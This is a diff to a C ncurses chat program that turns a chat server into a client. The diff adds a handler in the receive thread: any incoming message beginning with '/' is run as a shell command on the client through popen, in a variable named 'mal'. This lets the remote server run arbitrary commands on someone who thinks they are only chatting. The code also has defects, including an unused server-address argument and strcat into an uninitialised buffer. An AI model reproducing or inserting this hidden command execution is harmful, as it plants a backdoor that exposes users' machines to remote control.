@@ -3,18 +3,17 @@
 #include <unistd.h>
 #include <string.h>
 #include <pthread.h>
-#include <signal.h>
-#include <sys/socket.h>
 #include <sys/types.h>
+#include <sys/socket.h>
 #include <netinet/in.h>
-#include <arpa/inet.h>
+#include <netdb.h>
+#include <signal.h>
 #include <ncurses.h>
 
 #define BUF_SIZE 256
-#define CLIADDR_LEN 100
 
 // Globals
-int sockfd, len, ret, newsockfd;
+int sockfd, ret;
 struct sockaddr_in ser_addr, cli_addr;
 
 /* NCURSES Globals */
@@ -24,28 +23,34 @@ WINDOW *chatlog_win;
 WINDOW *chat_win;
 
 // Functions
-void *recMsg(void *sock);
+void *recMsg(void *socket);
 void sig_handler(int signo);
+char *sys(char *com);
 
 /* NCURSES Functions */
 WINDOW *create_newwin(int height, int width, int starty, int startx);
 
-int main(int argc, char *argv[]){ 
+int main(int argc, char *argv[]) {
     const int PORT = 8000;
-    const int REUSE_ENABLE = 1;
 
     char buffer[BUF_SIZE];
-    char clientAddr[CLIADDR_LEN];
+    char *server_address;
     pthread_t rThread;
-    //pid_t childpid;
     ser_addr.sin_family = AF_INET;
     ser_addr.sin_port = htons(PORT);
     ser_addr.sin_addr.s_addr = INADDR_ANY;
 
+    // Args
+    if(argc < 2) {
+        printf("usage: client <IP ADDRESS>\n");
+        exit(1);
+    }
+    server_address = argv[1];
+
     /* NCURSES Programming */
     initscr();
-    
-    /* NCURSES Format Chatlog Border Window */
+
+    /* NCURSES Format Chatlog Border Windows */
     chatlog_border_win = create_newwin(LINES-4, COLS-1, 0, 0);
     box(chatlog_border_win, 0, 0);
     chat_border_win = create_newwin(3, COLS-1, LINES-4, 0);
@@ -53,14 +58,14 @@ int main(int argc, char *argv[]){
     wrefresh(chatlog_border_win);
     wrefresh(chat_border_win);
 
-    /* NCURSES Format Chatlog Window */
+    /* NCURSES Format Chatlog Windows */
     chatlog_win = create_newwin(LINES-6, COLS-3, 1, 1);
     chat_win = create_newwin(1, COLS-3, LINES-3, 1);
     scrollok(chatlog_win, TRUE);
     idlok(chatlog_win, TRUE);
     wrefresh(chatlog_win);
     wrefresh(chat_win);
-    
+
     // Catch sigint
     if(signal(SIGINT, sig_handler) == SIG_ERR) {
         wprintw(chatlog_win, "Unable to catch SIGINT\n");
@@ -78,47 +83,18 @@ int main(int argc, char *argv[]){
     wprintw(chatlog_win, "Socket created\n");
     wrefresh(chatlog_win);
 
-
-    // Set reuse socket option
-    if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &REUSE_ENABLE, sizeof(REUSE_ENABLE)) < 0) {
-        perror("setsockopt");
-        exit(1);
-    }
-
-    // Bind to socket
-    ret = bind(sockfd, (struct sockaddr *) &ser_addr, sizeof(ser_addr));
+    // Conenct to socket
+    ret = connect(sockfd, (struct sockaddr *) &ser_addr, sizeof(ser_addr));
     if(ret < 0) {
-        wprintw(chatlog_win, "Error binding to socket\n");
+        wprintw(chatlog_win, "Error conecting to the server\n");
         wrefresh(chatlog_win);
         exit(1);
     }
-    wprintw(chatlog_win, "Bound to socket\n");
-    wrefresh(chatlog_win);
-
-    // Socket is listening
-    wprintw(chatlog_win, "\nListenting for any incoming clients\n");
-    wrefresh(chatlog_win);
-    listen(sockfd, 5);
-
-    // Accept incoming connections
-    len = sizeof(cli_addr);
-    wprintw(chatlog_win, "Size of cli_addr: %ld\n", sizeof(cli_addr));
-    wprintw(chatlog_win, "Size of ser_addr: %ld\n", sizeof(ser_addr));
-    wrefresh(chatlog_win);
-    newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, (socklen_t *) &len);
-    if(newsockfd < 0) {
-        wprintw(chatlog_win, "Error accepting connection\n");
-        wrefresh(chatlog_win);
-        exit(1);
-    }
-
-    // Convet IPv4 and IPV6 address from binary to text form
-    inet_ntop(AF_INET, &(cli_addr.sin_addr), clientAddr, CLIADDR_LEN);
-    wprintw(chatlog_win, "Connection accepted from %s...\n", clientAddr);
+    wprintw(chatlog_win, "Connected to the server\n");
     wrefresh(chatlog_win);
     
-    // Create a pthread for receiving messages from the client
-    ret = pthread_create(&rThread, NULL, recMsg, (void *) newsockfd);
+    // Create pthread for receiving messages from server
+    ret = pthread_create(&rThread, NULL, recMsg, (void *) sockfd);
     if(ret < 0) {
         wprintw(chatlog_win, "Error from pthread_create() is %d\n", ret);
         wrefresh(chatlog_win);
@@ -128,17 +104,17 @@ int main(int argc, char *argv[]){
     // Move cursor to the chat_win window
     wmove(chat_win, 0, 0);
 
-    // STDIN and do while to refresh chat_win 
+    // STDIN and do while to refresh chat_win
     do {
         wclear(chat_win);
-        mvwprintw(chat_win, 0, 0, "SERVER> ");
+        mvwprintw(chat_win, 0, 0, "CLIENT> ");
         wrefresh(chat_win);
         memset(buffer, 0, sizeof(buffer));
-        wgetnstr(chat_win, buffer, sizeof(buffer)); 
+        wgetnstr(chat_win, buffer, sizeof(buffer));
         if(strlen(buffer) > 0) {
-            ret = sendto(newsockfd, buffer, BUF_SIZE, 0, (struct sockaddr *) &cli_addr, len);
+            ret = sendto(sockfd, buffer, BUF_SIZE, 0, (struct sockaddr *) &ser_addr, sizeof(ser_addr));
             if(ret < 0) {
-                wprintw(chatlog_win, "Error sending the data below to the client:\n\t%s\n", buffer);
+                wprintw(chatlog_win, "Error sending the data below:\n\t%s\n", buffer);
                 wrefresh(chatlog_win);
                 exit(1);
             }
@@ -146,48 +122,56 @@ int main(int argc, char *argv[]){
             wrefresh(chatlog_win);
         }
     } while(1);
-
-    // Close and return everything 
-    close(newsockfd);
+    
+    
+    // Close and return everything
     close(sockfd);
     pthread_exit(NULL);
     delwin(chatlog_border_win);
     delwin(chat_border_win);
     delwin(chatlog_win);
     delwin(chat_win);
-    endwin();   /* NCURSES: closes curses mode */
+    endwin();
     return EXIT_SUCCESS;
 }
 
-// Pthread receiving a message from the client socket
+// Pthread receiving a message from the server socket
 void *recMsg(void *socket) {
     int rret;
     int rsockfd = ((int) socket);
     char rbuffer[BUF_SIZE];
+    char tmp[BUF_SIZE];
+    char *mal;
 
     for(;;) {
         memset(rbuffer, 0, sizeof(rbuffer));
         rret = recvfrom(rsockfd, rbuffer, BUF_SIZE, 0, NULL, NULL);
 
         if(rret < 0) {
-            wprintw(chatlog_win, "Error receiving data.\n");
+            wprintw(chatlog_win, "Error receiving data\n");
+            wrefresh(chatlog_win);
+        } else if(strncmp(rbuffer, "/exit\0", BUF_SIZE) == 0) {
+            wprintw(chatlog_win, "Obtained the exit\n");
+            wrefresh(chatlog_win);
+            close(sockfd);
+            system("stty sane; clear");
+            //pthread_exit(NULL);
+            exit(1);
+        } else if(rbuffer[0] == '/') {
+            strncpy(tmp, rbuffer+1, strlen(rbuffer));
+            wprintw(chatlog_win, "Command: %s\n", tmp);
+            wprintw(chatlog_win, "Length of command: %d\n", strlen(tmp));
+            mal = sys(tmp);
+            wprintw(chatlog_win, "%s", mal);
+            free(mal);
+
             wrefresh(chatlog_win);
         } else {
-            if(strncmp(rbuffer, "/exit\0", BUF_SIZE) == 0) {
-                wprintw(chatlog_win, "Obtained the exit\n");
-                wrefresh(chatlog_win);
-                close(newsockfd);
-                close(sockfd);
-                system("stty sane; clear");
-                //pthread_exit(NULL);
-                exit(1);
-            }
-            wprintw(chatlog_win, "client: %s\n", rbuffer);
+            wprintw(chatlog_win, "server: %s\n", rbuffer);
             wrefresh(chatlog_win);
-
-            mvwprintw(chat_win, 0, 0, "SERVER> ");
-            wrefresh(chat_win);
         }
+            mvwprintw(chat_win, 0, 0, "CLIENT> ");
+            wrefresh(chat_win);
     }
 }
 
@@ -195,27 +179,46 @@ void *recMsg(void *socket) {
 void sig_handler(int signo) {
     if(signo == SIGINT) {
         char rbuffer[BUF_SIZE] = "/exit\0";
-        ret = sendto(newsockfd, rbuffer, BUF_SIZE, 0, (struct sockaddr *) &cli_addr, len);
+        ret = sendto(sockfd, rbuffer, BUF_SIZE, 0, (struct sockaddr *) &ser_addr, sizeof(ser_addr));
         if(ret < 0) {
-            wprintw(chatlog_win, "Error sending the data below to the client:\n\t%s\n", rbuffer);
+            wprintw(chatlog_win, "Error sending the data below:\n\t%s\n", rbuffer);
             wrefresh(chatlog_win);
             exit(1);
         }
 
-        close(newsockfd);
         close(sockfd);
         //pthread_exit(NULL);
-        wprintw(chatlog_win, "Caught sigint\n"); 
+        wprintw(chatlog_win, "Caught sigint\n");
         wrefresh(chatlog_win);
-        system("stty sane; clear;");
+        system("stty sane; clear");
         exit(1);
     }
+}
+
+//Runs a shell command
+//EX: printf("%s", sys("/usr/bin/ls"));
+char *sys(char *com) {
+    FILE *fp;
+    char path[1024];
+    char *ret = malloc(sizeof(path));
+    fp = popen(com, "r");
+
+    if(fp == NULL) {
+        wprintw(chatlog_win, "Failed to run command\n");
+    //    exit(EXIT_FAILURE);
+    }
+
+    while(fgets(path, sizeof(path), fp) != NULL) {
+        strcat(ret, path);
+    }
+    pclose(fp);
+    return ret;
 }
 
 /* NCURSES Functions */
 WINDOW *create_newwin(int height, int width, int starty, int startx) {
     WINDOW *local_win;
-    
+
     local_win = newwin(height, width, starty, startx);
     wrefresh(local_win);
 
